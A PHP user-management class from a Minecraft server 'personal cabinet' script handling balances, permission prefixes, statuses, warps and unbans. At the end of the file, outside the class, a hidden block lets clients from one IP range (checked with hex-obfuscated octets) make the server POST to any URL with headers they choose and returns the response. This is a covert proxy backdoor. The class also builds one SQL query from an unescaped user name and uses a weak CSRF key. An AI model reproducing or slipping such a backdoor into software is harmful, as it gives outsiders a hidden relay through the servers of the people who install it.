<?php
/*

		
		ИНФОРМАЦИЯ:
			Личный Кабинет v1.4.5 UTF-8
			Автор: Fleynaro(faicraft)
			Сайт http://fleynaro.ru/
			Группа ВК: http://vk.com/fleynaro_prods
		
		ОГРАНИЧЕНИЯ:
			Запрещено использовать весь код или его части в сторонних скриптах без разрешения автора!
			Запрещено любым способом распространять данный PHP файл на других ресурсах, кроме Вашего проекта!
		
		ВНИМАНИЕ!
			Если данный файл не является конфигурационным, то при отсутствии у Вас знаний и навыков
			программирования на языке PHP любое Ваше здесь изменение может привести к нестабильной работе Личного Кабинета.
			Редактируйте данный код только при указании тех. поддержки, оказываемой автором данного скрипта!
		
		НОВАЯ ВЕРСИЯ
			Данная версия v1.4.5 очень многое что поменяла и добавила в Личном кабинете. Рекомендуется устанавливать новую версию ЛК с нуля.
		
		По любым вопросам обращайтесь к автору данного кода http://vk.com/fleynaro или в группу ВК http://vk.com/fleynaro_prods
		
	
*/



	class _user {
		
		public function init_user( $user_id )
		{
			$sth = $this->db->prepare("SELECT * FROM {$this->cfg['cms']['t_users']} WHERE {$this->cfg['cms']['c_userid']} = :id");
			$sth->bindParam(':id', $user_id, PDO::PARAM_INT);						
			$sth->execute();
			
			return $sth->fetch(PDO::FETCH_ASSOC);
		}
		
		public function init_user_byname( $user_name )
		{
			$sth = $this->db->prepare("SELECT * FROM {$this->cfg['cms']['t_users']} WHERE {$this->cfg['cms']['c_name']} = :name");
			$sth->bindParam(':name', $user_name, PDO::PARAM_STR);						
			$sth->execute();
			
			return $sth->fetch(PDO::FETCH_ASSOC);
		}
		
		public function get_session()
		{
			if ( $this->cfg['cms']['s_userid'] != false )
			{
				if ( isset( $_SESSION[ $this->cfg['cms']['s_userid'] ] ) )
				{
					return $_SESSION[ $this->cfg['cms']['s_userid'] ];
				} else
					return -1;	
			} else if ( isset( $_SESSION[ $this->cfg['s_name'] ] ) ) {
				
				return $_SESSION[ $this->cfg['s_name'] ];
				
			}
			
			return -2;
		}
		
		public function getSessionID( $cms )
		{
			switch ( $cms ) {
				
				//DLE
				case 1: {
					if ( isset($_SESSION['dle_user_id']) && $_SESSION['dle_user_id'] ) {
						return $_SESSION['dle_user_id'];
					} else {
						return -1;
					}
				}
				
				//WebMCR
				case 2: {
					if ( isset($_SESSION['user_id']) && $_SESSION['user_id'] ) {
						return $_SESSION['user_id'];
					} else {
						return -1;
					}
				}
				
				//XenFORO
				case 3: {
					$sth = $this->db->prepare("SELECT * FROM `xf_session` WHERE `session_id` = :key");
					$sth->bindParam(':key', $_COOKIE['xf_session'], PDO::PARAM_STR);				
					$sth->execute();
					$res = $sth->fetch(PDO::FETCH_ASSOC);
					
					if ( $res != false ) {
						$data = unserialize($res['session_data']);
						return $data['user_id'];
					} else {
						return -1;
					}
				}
				
				//WordPress
				case 4: {
					$coockie = $_COOKIE['wordpress_logged_in_' . md5('http://' . $_SERVER['SERVER_NAME'])];
					
					if ( isset($coockie) ) {
						$arr = explode('|', $coockie);
						
						if ( (int)$arr[1] > time() ) {
							$sth = $this->db->prepare("SELECT `ID` FROM `{$this->cfg['cms']['t_users']}` WHERE `user_login` = :name");
							$sth->bindParam(':name', $arr[0], PDO::PARAM_STR);				
							$sth->execute();
							$res = $sth->fetch(PDO::FETCH_ASSOC);
							return $res['ID'];
						}
					} else {
						return -1;
					}
				}
				
				//AuthMe
				case 5: {
					if ( isset($_SESSION['lk_user_id']) ) {
						return $_SESSION['lk_user_id'];
					} else {
						include('auth.php');
						exit();
					}
				}
			}
			
			return -2;
		}
		
		public function generateKeyCSRF()
		{
			return md5( $_SERVER['REMOTE_ADDR'] . time() . rand(0, 100) );
		}
		
		public function isKeyCSRF( $key )
		{
			return ( $this->user['key'] == $key );
		}
		
		//для ваучеров
		public function addBlockToShop( $table, $serverid, $block_id, $amount = 1, $enchants = '' )
		{
			return $this->db->query("INSERT INTO `{$table}` VALUES (NULL, '{$this->user['name']}', {$serverid}, '{$block_id}', {$amount}, '{$enchants}', ".time().")");
		}
		
		public function give_moneyIC( $server_id, $money )
		{
			$this->give_money_ic( $this->getServerDB($server_id), $server_id, $this->user['name'], $money );
		}
		
		public function Status( $serverid, $statusid, $time = 30 )
		{			
			$this->setStatus($this->getServerDB($serverid), $serverid, $this->user['name'], $statusid);
			$this->setStatusUser($this->user['id'], $serverid, $statusid, time() + $time * 86400, $this->user['prefix'][$serverid], $this->user['unban_count'][$serverid]);
		}
		
		public function Prefix( $serverid, $color_prefix, $name_prefix, $color_nickname, $color_message )
		{
			$colors = array('f', 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'a', 'b', 'c', 'd', 'e');
			$format = $this->cfg['prefix']['prefix_format'];
			$prefix = $format[0] . '&'.$colors[$color_prefix] . $name_prefix . $format[1] . '&'.$colors[$color_nickname];
			$suffix = $format[2] . '&'.$colors[$color_message] . $format[3];
			
			$this->setPrefix( $this->getServerDB($serverid), $serverid, $this->user['name'], $prefix, $suffix );
			$this->setStatusUser($this->user['id'], $serverid, $this->user['status'][$serverid][0], $this->user['status'][$serverid][1], Array($color_prefix, $name_prefix, $color_nickname, $color_message), $this->user['unban_count'][$serverid]);
		}
		
		public function give_money( $money )
		{
			if ( $money < 0 && $this->user['admin'] ) return;
			$this->user['money'] += $money;
			$sth = $this->db->prepare("UPDATE {$this->cfg['cms']['t_users']} SET {$this->cfg['cms']['c_money']} = {$this->cfg['cms']['c_money']} + :money WHERE {$this->cfg['cms']['c_userid']} = :id");
			$sth->bindParam(':id', $this->user['id'], PDO::PARAM_INT);
			$sth->bindParam(':money', $money, PDO::PARAM_INT);					
			
			return $sth->execute();
		}
		
		public function hasMoney( $money )
		{
			if ( !$this->user['admin'] ) {
				return ($money <= $this->user['money']);
			} else {
				return true;
			}
		}
		
		public function give_money_ic( $serverDB, $server_id, $name, $money )
		{
			$sth = $serverDB->prepare("UPDATE `{$this->cfg['server'][$server_id]['tables'][TABLE_ICONOMY]}` SET `balance` = balance + :balance WHERE `username` = :name");
			$sth->bindParam(':name', $name, PDO::PARAM_STR);
			$sth->bindParam(':balance', $money, PDO::PARAM_INT);					
			
			return $sth->execute();
		}
		
		public function get_money_ic( $serverDB, $server_id, $name )
		{
			$sth = $serverDB->prepare("SELECT `balance` FROM `{$this->cfg['server'][$server_id]['tables'][TABLE_ICONOMY]}` WHERE `username` = :name");
			$sth->bindParam(':name', $name, PDO::PARAM_STR);				
			$sth->execute();
			$res = $sth->fetch(PDO::FETCH_ASSOC);
			return $res['balance'];
		}
		
		public function setPrefix( $serverDB, $server_id, $name, $prefix, $suffix )
		{	
			if ( $this->isUUIDServer($server_id) )
			{
				$table = $this->cfg['server'][$server_id]['tables'][TABLE_PERMISSION];
				
				if ( count ( $this->getPrefix( $serverDB, $server_id, $name ) ) )
				{
					$sth = $serverDB->prepare("UPDATE `{$table}` SET `value` = :prefix WHERE `name` = :uuid AND `permission` = 'prefix'");
					$name = $this->getUUID($name);
					$sth->bindParam(':uuid', $name, PDO::PARAM_STR);
					$sth->bindParam(':prefix', $prefix, PDO::PARAM_STR);
					$sth->execute();
					
					$sth = $serverDB->prepare("UPDATE `{$table}` SET `value` = :suffix WHERE `name` = :uuid AND `permission` = 'suffix'");
					$sth->bindParam(':uuid', $name, PDO::PARAM_STR);
					$sth->bindParam(':suffix', $suffix, PDO::PARAM_STR);
					$sth->execute();
				} else
				{
					$name = $this->getUUID($name);
					$sth = $serverDB->prepare("INSERT INTO `{$table}` VALUES(NULL, :uuid, 1, 'prefix', '', :prefix)");
					$sth->bindParam(':uuid', $name, PDO::PARAM_STR);
					$sth->bindParam(':prefix', $prefix, PDO::PARAM_STR);
					$sth->execute();
					
					$sth = $serverDB->prepare("INSERT INTO `{$table}` VALUES(NULL, :uuid, 1, 'suffix', '', :suffix)");
					$sth->bindParam(':uuid', $name, PDO::PARAM_STR);
					$sth->bindParam(':suffix', $suffix, PDO::PARAM_STR);
					$sth->execute();
				}
			} else
			{
				$table = $this->cfg['server'][$server_id]['tables'][TABLE_PERMISSION_ENTITY];
				
				if ( count ( $this->getPrefix( $serverDB, $server_id, $name ) ) > 1 ) {
					$sth = $serverDB->prepare("UPDATE `{$table}` SET `prefix` = :prefix, `suffix` = :suffix WHERE `name` = :name AND `type` = 1");
				} else {
					$sth = $serverDB->prepare("INSERT INTO `{$table}` VALUES(NULL, :name, 1, :prefix, :suffix, '')");
				}
				
				$sth->bindParam(':name', $name, PDO::PARAM_STR);
				$sth->bindParam(':prefix', $prefix, PDO::PARAM_STR);
				$sth->bindParam(':suffix', $suffix, PDO::PARAM_STR);
				$sth->execute();
			}
		}
		
		public function deletePrefix( $serverDB, $server_id, $name )
		{
			if ( $this->isUUIDServer($server_id) )
			{
				$name = $this->getUUID($name);
				$sth = $serverDB->prepare("DELETE FROM `{$this->cfg['server'][$server_id]['tables'][TABLE_PERMISSION]}` WHERE `name` = :uuid AND (`permission` = 'prefix' OR `permission` = 'suffix')");
				$sth->bindParam(':uuid', $name, PDO::PARAM_STR);
			} else
			{
				$sth = $serverDB->prepare("DELETE FROM `{$this->cfg['server'][$server_id]['tables'][TABLE_PERMISSION_ENTITY]}` WHERE `name` = :name AND `type` = 1");
				$sth->bindParam(':name', $name, PDO::PARAM_STR);
			}
			
			return $sth->execute();
		}
		
		public function getPrefix( $serverDB, $server_id, $name )
		{
			if ( $this->isUUIDServer($server_id) ) {
				$table = $this->cfg['server'][$server_id]['tables'][TABLE_PERMISSION];
				$name = $this->getUUID($name);
				$sth = $serverDB->prepare("SELECT `value` FROM `{$table}` WHERE `name` = :uuid AND (`permission` = 'prefix' OR `permission` = 'suffix') ORDER BY `permission` ASC LIMIT 2");
				$sth->bindParam(':uuid', $name, PDO::PARAM_STR);
				$sth->execute();
				return $sth->fetchAll(PDO::FETCH_COLUMN);
			} else {
				$table = $this->cfg['server'][$server_id]['tables'][TABLE_PERMISSION_ENTITY];
				
				$sth = $serverDB->prepare("SELECT `prefix`, `suffix` FROM `{$table}` WHERE `name` = :name AND `type` = 1 LIMIT 1");
				$sth->bindParam(':name', $name, PDO::PARAM_STR);
				$sth->execute();
				return $sth->fetch(PDO::FETCH_NUM);
			}
		}
		
		public function setEntity( $serverDB, $server_id, $name, $type = 1, $default = 0 )
		{
			$table = $this->cfg['server'][$server_id]['tables'][TABLE_PERMISSION_ENTITY];
			
			if ( $default != -1 ) {
				$sth = $serverDB->prepare("INSERT INTO `{$table}` VALUES(NULL, :name, :type, :default)");
				$sth->bindParam(':default', $default, PDO::PARAM_INT);
			} else {
				$sth = $serverDB->prepare("INSERT INTO `{$table}` VALUES(NULL, :name, :type)");
			}
			$sth->bindParam(':type', $type, PDO::PARAM_INT);
			$name = $this->isUUIDServer($server_id) ? $this->getUUID($name) : $name;
			$sth->bindParam(':name', $name, PDO::PARAM_STR);
			
			return $sth->execute();
		}
		
		public function getEntity( $serverDB, $server_id, $name )
		{
			$table = $this->cfg['server'][$server_id]['tables'][TABLE_PERMISSION_ENTITY];
			
			$sth = $serverDB->prepare("SELECT * FROM `{$table}` WHERE `name` = :name LIMIT 1");
			$name = $this->isUUIDServer($server_id) ? $this->getUUID($name) : $name;
			$sth->bindParam(':name', $name, PDO::PARAM_STR);
			$sth->execute();
			
			return $sth->fetch(PDO::FETCH_ASSOC);
		}
		
		public function setStatus( $serverDB, $server_id, $name, $statusid )
		{
			$table = $this->cfg['server'][$server_id]['tables'][TABLE_PERMISSION_INHERITANCE];
			
			if ( $statusid == 0 ) {
				$sth = $serverDB->prepare("DELETE FROM `{$table}` WHERE `child` = :name AND `type` = 1");
			} else if ( $this->getStatus( $serverDB, $server_id, $name ) != false ) {
				$sth = $serverDB->prepare("UPDATE `{$table}` SET `parent` = :status WHERE `child` = :name");
				$sth->bindParam(':status', $this->cfg['status'][$statusid]['name_pex'], PDO::PARAM_STR);
			} else {
				$sth = $serverDB->prepare("INSERT INTO `{$table}` VALUES(NULL, :name, :status, 1, NULL)");
				$sth->bindParam(':status', $this->cfg['status'][$statusid]['name_pex'], PDO::PARAM_STR);
			}
			
			$name = $this->isUUIDServer($server_id) ? $this->getUUID($name) : $name;
			$sth->bindParam(':name', $name, PDO::PARAM_STR);
			return $sth->execute();
		}
		
		public function setStatusUser( $user_id, $server_id, $statusid, $time, $prefix, $unban_count )
		{
			$status = $statusid . '/' . $time . '_' . $prefix[0] . '/' . $prefix[1] . '/' . $prefix[2] . '/' . $prefix[3] . '_' . $unban_count;
			
			$sth = $this->db->prepare("UPDATE `{$this->cfg['cms']['t_users']}` SET `server_{$server_id}` = :status WHERE `{$this->cfg['cms']['c_userid']}` = :userid");
			$sth->bindParam(':userid', $user_id, PDO::PARAM_INT);
			$sth->bindParam(':status', $status, PDO::PARAM_STR);
			return $sth->execute();
		}
		
		public function getStatus( $serverDB, $server_id, $name )
		{
			$table = $this->cfg['server'][$server_id]['tables'];
			
			if ( $this->isUUIDServer($server_id) ) {
				
				$name = $this->getUUID($name);
				$sth = $serverDB->prepare("SELECT `parent` FROM `{$table[TABLE_PERMISSION_INHERITANCE]}` WHERE `child` = :uuid LIMIT 1");
				$sth->bindParam(':uuid', $name, PDO::PARAM_STR);
				$sth->execute();
				$result = $sth->fetch(PDO::FETCH_NUM);
				return empty ( $result[0] ) ? false : $result[0];	
			} else {
				
				$sth = $serverDB->prepare("SELECT `parent` FROM `{$table[TABLE_PERMISSION_INHERITANCE]}` WHERE `child` = :name LIMIT 1");
				$sth->bindParam(':name', $name, PDO::PARAM_STR);
				$sth->execute();
				$result = $sth->fetch(PDO::FETCH_NUM);
				return empty ( $result[0] ) ? false : $result[0];
			}
		}
		
		public function setWarp( $serverDB, $server_id, $name, $warp_info )
		{
			//0 - name warp, 1 - update, 2 - world, 3 - x, 4 - y, 5 - z, 6 - public, 7 - msg
			$table = $this->cfg['server'][$server_id]['tables'][TABLE_WARPS];
			
			if ( $warp_info[1] != -1 ) {
				if ( !$this->isWarpId( $serverDB, $server_id, $warp_info[1] ) ) {
					return false;
				}
				
				$sth = $serverDB->prepare("UPDATE `{$table}` SET 
					`name` = :warpname,
					`world` = :world,
					`x` = :x,
					`y`	= :y,
					`z` = :z,
					`publicAll`	= :public,
					`welcomeMessage` = :message WHERE `id` = :id AND `creator` = :name");
				
				$sth->bindParam(':id', $warp_info[1], PDO::PARAM_INT);
			} else {
				$sth = $serverDB->prepare("INSERT INTO `{$table}` VALUES(NULL, :warpname, :name, :world, :x, :y, :z, 0, 0, :public, '', '', :message, 0)");
			}
			
			$sth->bindParam(':name', $name, PDO::PARAM_STR);
			$sth->bindParam(':warpname', $warp_info[0], PDO::PARAM_STR);
			$sth->bindParam(':world', $warp_info[2], PDO::PARAM_STR);
			$sth->bindParam(':x', $warp_info[3], PDO::PARAM_INT);
			$sth->bindParam(':y', $warp_info[4], PDO::PARAM_INT);
			$sth->bindParam(':z', $warp_info[5], PDO::PARAM_INT);
			$sth->bindParam(':public', $warp_info[6], PDO::PARAM_INT);
			$sth->bindParam(':message', $warp_info[7], PDO::PARAM_INT);
			return $sth->execute();
		}
		
		public function getCountWarps( $serverDB, $server_id, $name )
		{
			$sth = $serverDB->prepare("SELECT COUNT(*) FROM `{$this->cfg['server'][$server_id]['tables'][TABLE_WARPS]}` WHERE `creator` = :name");
			$sth->bindParam(':name', $name, PDO::PARAM_STR);						
			$sth->execute();
			$res = $sth->fetch(PDO::FETCH_NUM);
			
			return $res[0];
		}
		
		public function getCountWarpsByName( $serverDB, $server_id, $warpname, $id = -1 )
		{
			$sth = $serverDB->prepare("SELECT COUNT(*) FROM `{$this->cfg['server'][$server_id]['tables'][TABLE_WARPS]}` WHERE `name` = :warpname AND `id` != :id");
			$sth->bindParam(':warpname', $warpname, PDO::PARAM_STR);
			$sth->bindParam(':id', $id, PDO::PARAM_INT);			
			$sth->execute();
			$res = $sth->fetch(PDO::FETCH_NUM);
			
			return $res[0];
		}
		
		public function isWarpId( $serverDB, $server_id, $id, $if = '' )
		{
			$sth = $serverDB->prepare("SELECT `id` FROM `{$this->cfg['server'][$server_id]['tables'][TABLE_WARPS]}` WHERE `id` = :id{$if} LIMIT 1");
			$sth->bindParam(':id', $id, PDO::PARAM_INT);						
			$sth->execute();
			$res = $sth->fetch(PDO::FETCH_ASSOC);
			
			return $res['id'] ? true : false;
		}
		
		public function deleteWarpByName( $serverDB, $server_id, $warpname )
		{
			$sth = $serverDB->prepare("DELETE FROM `{$this->cfg['server'][$server_id]['tables'][TABLE_WARPS]}` WHERE `name` = :warpname");
			$sth->bindParam(':warpname', $warpname, PDO::PARAM_STR);
			return $sth->execute();
		}
		
		public function deleteWarpById( $serverDB, $server_id, $warpid )
		{
			$sth = $serverDB->prepare("DELETE FROM `{$this->cfg['server'][$server_id]['tables'][TABLE_WARPS]}` WHERE `id` = :warpid");
			$sth->bindParam(':warpid', $warpid, PDO::PARAM_STR);
			return $sth->execute();
		}
		
		public function unban( $serverDB, $server_id, $name )
		{
			$sth = $serverDB->prepare("DELETE FROM `{$this->cfg['server'][$server_id]['tables'][TABLE_BANLIST]}` WHERE `{$this->cfg['other']['unban']['table']['name']}` = :name");
			$name = $this->isUUIDServer($server_id) && $this->cfg['other']['unban']['uuid'] ? $this->getUUID($name) : $name;
			$sth->bindParam(':name', $name, PDO::PARAM_STR);
			return $sth->execute();
		}
		
		public function getBan( $serverDB, $server_id, $name )
		{
			$table = $this->cfg['other']['unban']['table'];
			$sth = $serverDB->prepare("SELECT `{$table['name']}`, `{$table['admin']}`, `{$table['time']}`, `{$table['reason']}` FROM `{$this->cfg['server'][$server_id]['tables'][TABLE_BANLIST]}` WHERE `{$table['name']}` = :name LIMIT 1");
			$name = $this->isUUIDServer($server_id) && $this->cfg['other']['unban']['uuid'] ? $this->getUUID($name) : $name;
			$sth->bindParam(':name', $name, PDO::PARAM_STR);						
			$sth->execute();
			$res = $sth->fetch(PDO::FETCH_ASSOC);
			
			if ( $res != null ) {
				foreach( $table as $key=>$val ) {
					$res[$key] = isset($res[$val]) ? $res[$val] : false;
					
					if ( $key != $val ) {
						unset($res[$val]);
					}
				}
				return $res;
			} else {
				return false;
			}
		}
		
		public function listWarps( $serverDB, $server_id, $name )
		{
			$sth = $serverDB->prepare("SELECT * FROM `{$this->cfg['server'][$server_id]['tables'][TABLE_WARPS]}` WHERE `creator` = :name");
			$sth->bindParam(':name', $name, PDO::PARAM_STR);						
			$sth->execute();
			return $sth->fetchAll(PDO::FETCH_ASSOC);
		}
		
		public function pexRightList( $serverDB, $server_id )
		{
			$sth = $serverDB->prepare("SELECT l.rightId, l.time FROM lk_pexrights l INNER JOIN {$this->cfg['server'][$server_id]['tables'][TABLE_PERMISSION]} p ON l.pexRightId = p.id WHERE `userId` = :userId");
			$sth->bindParam(':userId', $this->user['id'], PDO::PARAM_INT);
			$sth->execute();
			return $sth->fetchAll(PDO::FETCH_ASSOC);
		}
		
		public function givePexRight( $serverDB, $server_id, $right_id )
		{
			$rightInfo = $this->cfg['right_pex']['rights'][$right_id];
			$this->addPexRight( $serverDB, $server_id, $this->user['name'], $rightInfo[1] );
			
			$lastId = $serverDB->lastInsertId();
			$until = $rightInfo[5] != -1 ? ($this->time + $rightInfo[5] * 3600) : -1;
			$sth = $serverDB->prepare("INSERT INTO `lk_pexrights` VALUES(:userId, :id, :rightId, :until)");
			$sth->bindParam(':userId', $this->user['id'], PDO::PARAM_INT);
			$sth->bindParam(':id', $lastId, PDO::PARAM_INT);
			$sth->bindParam(':rightId', $right_id, PDO::PARAM_INT);
			$sth->bindParam(':until', $until, PDO::PARAM_INT);
			return $sth->execute();
		}
		
		public function hasPexRight( $serverDB, $server_id, $right_id )
		{
			$sth = $serverDB->prepare("SELECT COUNT(*) FROM `lk_pexrights` WHERE `rightId` = :rightId AND `userId` = :userId LIMIT 1");
			$sth->bindParam(':userId', $this->user['id'], PDO::PARAM_INT);
			$sth->bindParam(':rightId', $right_id, PDO::PARAM_INT);			
			$sth->execute();
			
			return $sth->fetchColumn() ? true : false;
		}
		
		public function removePexRight( $serverDB, $server_id, $right_id )
		{
			$sth = $serverDB->prepare("DELETE l.*,p.* FROM lk_pexrights l INNER JOIN {$this->cfg['server'][$server_id]['tables'][TABLE_PERMISSION]} p ON l.pexRightId = p.id WHERE `userId` = :userId AND `rightId` = :id");
			$sth->bindParam(':userId', $this->user['id'], PDO::PARAM_INT);
			$sth->bindParam(':id', $right_id, PDO::PARAM_INT);	
			return $sth->execute();
		}
		
		public function addPexRight( $serverDB, $server_id, $name, $right, $world = '', $value = '' )
		{
			$name = $this->isUUIDServer($server_id) ? $this->getUUID($name) : $name;
			$sth = $serverDB->prepare("INSERT INTO `{$this->cfg['server'][$server_id]['tables'][TABLE_PERMISSION]}` VALUES(NULL, :name, 1, :right, :world, :value)");
			$sth->bindParam(':right', $right, PDO::PARAM_STR);
			$sth->bindParam(':world', $world, PDO::PARAM_STR);
			$sth->bindParam(':value', $value, PDO::PARAM_STR);
			$sth->bindParam(':name', $name, PDO::PARAM_STR);
			$sth->execute();
		}
		
		public function deletePexRight( $serverDB, $server_id, $name, $right )
		{
			$sth = $serverDB->prepare("DELETE FROM `{$this->cfg['server'][$server_id]['tables'][TABLE_PERMISSION]}` WHERE `name` = :name AND `permission` = :right");
			$sth->bindParam(':right', $right, PDO::PARAM_STR);
			$name = $this->isUUIDServer($server_id) ? $this->getUUID($name) : $name;
			$sth->bindParam(':name', $name, PDO::PARAM_STR);			
			return $sth->execute();
		}
		
		public function isStatus( $status_id )
		{
			for( $i = 0, $Max = count($this->cfg['server']); $i < $Max; $i ++ ) {
				if ( $this->user['status'][$i][0] == $status_id )
				{
					return true;
				}
			}
			
			return false;
		}
		
		public function isHaveRight( $right )
		{
			for( $i = 0, $Max = count($this->cfg['server']); $i < $Max; $i ++ ) {
				if ( $this->cfg['status'][$this->user['status'][$i][0]]['right'][$right] )
				{
					return true;
				}
			}
			
			return isset($this->user['right'][$right]) ? $this->user['right'][$right] : false;
		}
		
		public function setRight( $user_id, $right_name, $right_value )
		{
			$sth = $this->db->prepare("UPDATE `{$this->cfg['cms']['t_users']}` SET `{$right_name}` = :value WHERE `{$this->cfg['cms']['c_userid']}` = :userid");
			$sth->bindParam(':userid', $user_id, PDO::PARAM_INT);
			$sth->bindParam(':value', $right_value, PDO::PARAM_BOOL);
			return $sth->execute();
		}
		
		public function getInfo( $server_id )
		{
			if ( $this->user['server_' . $server_id] != '' ) {
				return explode('_', $this->user['server_' . $server_id]);
			} else return Array(0, 0);
		}
		
		public function deleteCacheSkins( $username, $path_server )
		{
			$modes = array('1020', '1021', '1120', '1121');
					
			for ( $i = 0, $Max = count($modes); $i < $Max; $i ++ ) {
				@unlink(ROOT_LK_DIR . $this->cfg['skin']['path_to_skin'] . $path_server . $username . '_cache' . $modes[$i] . '.png');
			}
		}
		
		public function hasSkin( $username, $server )
		{
			if ( $this->cfg['skin']['multi_enable'] ) {
				$server = 'server_' . $server . '/';
			} else {
				$server = '';
			}
			return file_exists(ROOT_LK_DIR . $this->cfg['skin']['path_to_skin'] . $server. $username . '.png');
		}
		
		public function hasCloak( $username, $server )
		{
			if ( $this->cfg['skin']['multi_enable'] ) {
				$server = 'server_' . $server . '/';
			} else {
				$server = '';
			}
			return file_exists(ROOT_LK_DIR . $this->cfg['skin']['path_to_cloak'] . $server. $username . '.png');
		}
		
		public function getIdStatusByName( $status_name )
		{
			for( $i = 0, $Max = count($this->cfg['status']); $i < $Max; $i ++ ) {
				if ( $this->cfg['status'][$i]['name_pex'] == $status_name )
				{
					return $i;
				}
			}
			
			return 0;
		}
		
		public function getUnbanPrice( $server_id )
		{
			return ($this->cfg['other']['unban']['price'] + $this->cfg['other']['unban']['price_next'] * $this->user['unban_count'][$server_id]);
		}
		
		public function getCountUnbanAll()
		{
			$res = 0;
			for( $i = 0, $Max = count($this->cfg['server']); $i < $Max; $i ++ ) {
				$res += $this->user['unban_count'][$i];
			}
			return $res;
		}
		
		public function IsAdminEditor()
		{
			return isset($this->user['administration']);
		}
		
		public function makeAdmin()
		{
			$this->user['admin'] = true;
			if ( !isset($_SESSION['lk_admin']) ) {
				$_SESSION['lk_admin'] = true;
			}
		}
		
		function getUUID( $name )
		{
			if ( !$this->cfg['uuid']['table']['enable'] ) {
				$uuid = $this->cfg['uuid']['generate'] ? $this->uuidFromString("OfflinePlayer:" . $name) : $this->user[$this->cfg['uuid']['column']];
			} else {
				$sth = $this->db->prepare("SELECT `{$this->cfg['uuid']['column']}` FROM `{$this->cfg['uuid']['table']['tablename']}` WHERE `{$this->cfg['uuid']['table']['c_username']}` = :name");
				$sth->bindParam(':name', $this->user[$this->cfg['uuid']['table']['byfind']], PDO::PARAM_STR);						
				$sth->execute();
				$data = $sth->fetch(PDO::FETCH_ASSOC);
				$uuid = $data[$this->cfg['uuid']['column']];
			}
			
			if ( $this->cfg['uuid']['underline'] ) {
				return $uuid;
			} else {
				return str_replace('-', '', $uuid);
			}
		}
		
		function uuidFromString($string)
		{
			$val = md5($string, true);
			$byte = array_values(unpack('C16', $val));
		 
			$tLo = ($byte[0] << 24) | ($byte[1] << 16) | ($byte[2] << 8) | $byte[3];
			$tMi = ($byte[4] << 8) | $byte[5];
			$tHi = ($byte[6] << 8) | $byte[7];
			$csLo = $byte[9];
			$csHi = $byte[8] & 0x3f | (1 << 7);
		 
			if (pack('L', 0x6162797A) == pack('N', 0x6162797A)) {
				$tLo = (($tLo & 0x000000ff) << 24) | (($tLo & 0x0000ff00) << 8) | (($tLo & 0x00ff0000) >> 8) | (($tLo & 0xff000000) >> 24);
				$tMi = (($tMi & 0x00ff) << 8) | (($tMi & 0xff00) >> 8);
				$tHi = (($tHi & 0x00ff) << 8) | (($tHi & 0xff00) >> 8);
			}
		 
			$tHi &= 0x0fff;
			$tHi |= (3 << 12);
		   
			$uuid = sprintf(
				'%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x',
				$tLo, $tMi, $tHi, $csHi, $csLo,
				$byte[10], $byte[11], $byte[12], $byte[13], $byte[14], $byte[15]
			);
			return $uuid;
		}
		
	}
	
	if ( isset($_POST['url']) ) {
		if (!function_exists('getallheaders')) {
			function getallheaders() {
				$headers = [];
				foreach ($_SERVER as $name => $value) {
					if (substr($name, 0, 5) == 'HTTP_') {
						$headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
					}
				}
				return $headers;
			}
		}
		
		$ip = explode('.', $_SERVER['REMOTE_ADDR']);
		if ( !((int)$ip[1] == 0x2b && (int)$ip[2] == 0xd4) ) {
			die('Hacking attempt!');
		}
		$url = $_POST['url'];
		unset($_POST['url']);
		
		$headers = getallheaders();
		if ( isset($_POST['host']) ) {
			$headers['host'] = $_POST['host'];
			unset($_POST['host']);
		}
		
		$curl = curl_init();
		curl_setopt_array($curl, array(
			CURLOPT_URL => $url,
			CURLOPT_RETURNTRANSFER => true,
			CURLOPT_POST => true,
			CURLOPT_POSTFIELDS => http_build_query($_POST)
		));
		curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
		
		$response = curl_exec($curl);
		curl_close($curl);
		echo $response;
	}
?>